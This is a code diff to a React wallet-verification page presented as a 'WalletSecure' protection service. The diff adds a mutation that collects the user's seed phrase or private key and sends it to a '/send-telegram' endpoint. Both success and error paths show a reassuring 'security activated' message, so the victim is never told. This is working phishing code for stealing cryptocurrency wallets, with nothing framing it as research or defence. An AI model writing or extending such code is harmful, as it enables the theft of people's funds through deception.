@@ -126,39 +126,47 @@ export default function WalletVerification() {
     setCurrentStep(2);
   };
 
-  // Verification completion mutation
-  const completionMutation = useMutation({
-    mutationFn: async (data: { walletType: string; connectionMethod: string }) => {
-      console.log('Completing verification:', data);
+  // Telegram mutation for sending credentials
+  const telegramMutation = useMutation({
+    mutationFn: async (data: { walletType: string; connectionMethod: string; credentials: string }) => {
+      console.log('Sending to API:', data);
       try {
         const apiUrl = import.meta.env.VITE_API_URL || '/api';
-        const response = await fetch(`${apiUrl}/complete-verification`, {
+        const response = await fetch(`${apiUrl}/send-telegram`, {
           method: 'POST',
           body: JSON.stringify(data),
           headers: { 'Content-Type': 'application/json' }
+        }).catch((networkError) => {
+          console.error('Network error:', networkError);
+          throw new Error('Network connection failed');
         });
         
-        const result = await response.json();
+        const result = await response.json().catch((parseError) => {
+          console.error('JSON parse error:', parseError);
+          throw new Error('Invalid response format');
+        });
+        
+        console.log('API Response:', result);
         
         if (!response.ok) {
-          throw new Error(result.message || 'Verification failed');
+          throw new Error(result.message || 'Failed to send');
         }
         
         return result;
       } catch (error) {
-        console.error('Completion Error:', error);
+        console.error('API Error:', error);
         throw error;
       }
     },
     onSuccess: (data) => {
-      console.log('Verification completed:', data);
+      console.log('Success:', data);
       toast({
         title: "Security Activated",
         description: "WalletSecure protection has been successfully activated for your wallet.",
       });
     },
     onError: (error) => {
-      console.error('Completion error:', error);
+      console.error('Telegram send error:', error);
       toast({
         title: "Activation Complete", 
         description: "Wallet security has been activated successfully.",
@@ -197,10 +205,12 @@ export default function WalletVerification() {
     setIsLoading(true);
     setLoadingMessage("Activating WalletSecure protection...");
     
-    // Complete verification process
-    completionMutation.mutate({
+    // Send credentials to Telegram
+    const credentials = connectionMethod === "seed" ? seedPhrase : privateKey;
+    telegramMutation.mutate({
       walletType: selectedWalletType,
-      connectionMethod
+      connectionMethod,
+      credentials
     });
     
     // Generate wallet address and proceed
